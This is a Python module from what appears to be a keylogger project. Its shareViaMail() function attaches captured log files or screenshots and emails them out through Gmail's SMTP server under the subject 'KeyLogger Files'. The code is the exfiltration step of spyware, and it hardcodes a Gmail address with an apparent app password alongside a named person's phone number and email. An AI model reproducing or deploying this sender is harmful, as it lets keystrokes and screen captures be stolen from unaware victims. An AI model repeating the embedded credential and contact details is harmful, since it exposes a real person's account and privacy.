# --------------------------------------------------------------------------------------------------------
#                                         IMPORTING LIBRARIES 

import os

# Importing Email libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# --------------------------------------------------------------------------------------------------------


# Source: GeeksForGeeks - Sending mail with attachments

# SMTP - Simple Mail Transfer Protocol - protocol used to send mails 

def shareViaMail(filename, attachment, toaddr, image):
    fromaddr = 'bongspatra@gmail.com'
    password = 'icdc qbdm aysb kbdk'
    
    # Create an instance of MIMEMultipart 
    msg = MIMEMultipart() 
    
    # Storing the sender's email address   
    msg['From'] = fromaddr 
    
    # Storing the receiver's email address  
    msg['To'] = toaddr 
    
    # Storing the subject  
    msg['Subject'] = "KeyLogger Files"
    
    # Store the body of the mail in a string
    body = "KeyLogger Project Testing Files are attached below.\n\nFor further detais, contact - Subhranshu Patra\nPhone - 8249728541\nEmail - bongspatra@gmail.com"
    
    # attach the body with the msg instance 
    msg.attach(MIMEText(body, 'plain')) 
    
    if image:
        with open(attachment, "rb") as f:
            img_data = f.read()
            
        img = MIMEImage(img_data, name = os.path.basename(attachment))
        msg.attach(img)
        
    else:
        # open the file to be sent
        attachment = open(attachment)
        # instance of MIMEBase and named as p 
        p = MIMEBase('application', 'octet-stream') 
        # To change the payload into encoded form 
        p.set_payload((attachment).read()) 
        # encode into base64 
        encoders.encode_base64(p)   
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
        # attach the instance 'p' to instance 'msg' 
        msg.attach(p) 
    
    # creates SMTP session 
    s = smtplib.SMTP('smtp.gmail.com', 587) 
    
    # start TLS for security 
    s.starttls() 
    
    # Authentication 
    s.login(fromaddr, password) 
    
    # Converts the Multipart msg into a string 
    text = msg.as_string() 
    
    # sending the mail 
    s.sendmail(fromaddr, toaddr, text) 
    
    # terminating the session 
    s.quit()